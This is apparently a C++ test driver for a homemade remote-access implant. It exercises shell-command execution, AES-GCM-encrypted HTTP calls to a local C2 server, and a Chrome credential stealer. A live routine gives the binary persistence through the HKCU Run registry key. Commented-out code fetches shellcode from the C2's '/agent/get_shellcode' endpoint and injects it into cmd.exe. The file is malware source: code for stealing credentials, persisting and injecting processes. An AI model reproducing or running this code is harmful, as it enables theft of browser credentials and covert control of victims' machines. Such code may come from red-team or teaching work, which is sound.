#include "exec_shell.h"
#include "aes_gcm.h"
#include "http.h"
#include "inject.h"
#include "../stealer/chrome.cpp"
#include <iostream>
#include <fstream>


// BYTE textIV[] = {0x87, 0xb8, 0xa9, 0xa6, 0xc2, 0x39, 0x42, 0x5f, 0xc2, 0xda, 0x8c, 0xc1};
// BYTE key[] = {0x41, 0x13, 0xcd, 0xa3, 0xa0, 0xe0, 0xab, 0x5e, 0x19, 0xf1, 0xc0, 0x1c, 0x6d, 0x4e, 0x77, 0xc5, 0xe5, 0x20, 0xd2, 0x44, 0xe, 0x52, 0xae, 0x87, 0xaa, 0xa, 0x96, 0x67, 0x28, 0x82, 0xea, 0x8};
LPCWSTR c2Domain = L"127.0.0.1";
LPCWSTR registerURI = L"/agent/register";
LPCWSTR testURI = L"test";
std::string password = "password";
int port = 5000;

// helper function to print a byte array
void printHexArray(BYTE* data, int len) {
    printf("{");
    for (int i = 0; i < len; i++) {
        if (i != 0) {
            printf(", ");
        }
        printf("0x%x", data[i]);
    }
    printf("}\n");
}

void test_exec_shell() {
    std::string cmd = "powershell /c whoami \0";
    std::string res = exec_shell(&cmd[0]);
    std::cout << cmd << ": " << std::endl;
    std::cout << res << std::endl;

    cmd = "powershell /c pwd \0";
    res = exec_shell(&cmd[0]);
    std::cout << cmd << ": " << std::endl;
    std::cout << res << std::endl;

    cmd = "powershell /c ls \0";
    res = exec_shell(&cmd[0]);
    std::cout << cmd << ": " << std::endl;
    std::cout << res << std::endl;

    std::cout << "pre-defined commands: " << std::endl;

    std::cout << exec_shell(CommonCmd::whoami) << std::endl;

    std::cout << exec_shell(CommonCmd::ls) << std::endl;

    std::cout << exec_shell(CommonCmd::os_info) << std::endl;

    std::cout << exec_shell(CommonCmd::sys_info) << std::endl;

    std::cout << exec_shell(CommonCmd::cpu_num) << std::endl;
}

void test_aesgcm() {
    // BYTE message[] = "Test message";

    // auto box = new AESGCM(key);
    // box->Encrypt( (BYTE*) textIV, sizeof(textIV), (BYTE*) message, sizeof(message));

    // printf("ciphertext: ");
    // printHexArray(box->ciphertext, box->ciphertextSize);
    // printf("tag: ");
    // printHexArray(box->tag, box->authTagLengths.dwMaxLength);

    // box->Decrypt(textIV, sizeof(textIV), box->ciphertext, sizeof(message), box->tag, box->authTagLengths.dwMinLength );
    // for(size_t i=0; i< box->ptBufferSize; i++){
    //     printf("%c", (char) box->plaintext[i]);
    // }
    // printf("\n");

    // delete box;
}

void test_http() {
    // std::string message = "Test message";

    // std::cout << "sending get request\n";
    // std::string getResponse = httpGet(c2Domain, port, testURI);

    // std::cout << getResponse << std::endl;

    // std::cout << "sending post request\n";
    // std::string response = httpPost(c2Domain, port, testURI, message);

    // std::cout << response << std::endl;

    // BYTE testBytes[] = {0x87, 0xb8, 0xa9, 0xa6, 0xc2, 0x39, 0x42, 0x5f, 0xc2, 0xda, 0x8c, 0xc1, 0xb5, 0x6a,
    //                     0x9b, 0x69, 0x26, 0x0e, 0x79, 0x75, 0xe5, 0x81, 0x29, 0xe0, 0x6d, 0x68, 0xb3, 0x62, 
    //                     0x1f, 0xc4, 0x4d, 0xa3, 0x55, 0xda, 0x0f, 0x32, 0xb6, 0xd2, 0x89, 0x7b, 0x22};
    // std::vector<BYTE> testVec(testBytes, testBytes + sizeof(testBytes));

    // std::string decrypted = decryptPayload(testVec);
    // std::cout << decrypted << std::endl;
}

void test_inject()
{
    
    // std::string exePath = "C:\\WINDOWS\\System32\\cmd.exe";
    // std::string response = httpRequest(L"GET", c2Domain, port, L"/agent/get_shellcode", "");
    // std::cout << response.size() << std::endl;
    // char* shellcode = &*response.begin();
    // printHexArray((BYTE*) shellcode, 10);
    // std::cout << inject(exePath, shellcode, response.size()) << std::endl;
}

void test_persistence()
{
    // LPTSTR pwd;
    // DWORD pwdSize = GetCurrentDirectoryA(0, NULL);
    // pwd = (LPTSTR) malloc(pwdSize);
    // GetCurrentDirectory(pwdSize, pwd);
    // std::cout << buffer << std::endl;
    
    char exepath[MAX_PATH];
    GetModuleFileNameA(0, exepath, MAX_PATH);

    printf("executable path: %s\n", exepath);

    HKEY hKey;
    LSTATUS status = RegOpenKeyA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        &hKey
    );

    if (status != ERROR_SUCCESS) {
        printf("Error %d: unable to open key\n", status);
    }

    status = RegSetValueExA(
        hKey,
        "test.exe",
        0,
        REG_SZ,
        (BYTE*)exepath,
        strlen(exepath)
    );

    if (status != ERROR_SUCCESS) {
        printf("Error %d: unable to set key\n", status);
    }

    RegCloseKey(hKey);
}

void test_stealer() {
    stealer();
}

int main(int argc, char* argv[])
{   
    if (argc != 2) {
        std::cout << "specify which test to run" << std::endl;
        return 0;
    }

    std::string test_name = std::string(argv[1]);

    if (test_name == "exec_shell") {
        test_exec_shell();
    } else if (test_name == "aesgcm") {
        test_aesgcm();
    } else if (test_name == "http") {
        test_http();
    } else if (test_name == "inject") {
        test_inject();
    } else if (test_name == "persistence") {
        test_persistence();
    } else if (test_name == "stealer") {
        test_stealer();
    } else {
        std::cout << "test name invalid" << std::endl;
    }
    
    return 0;
}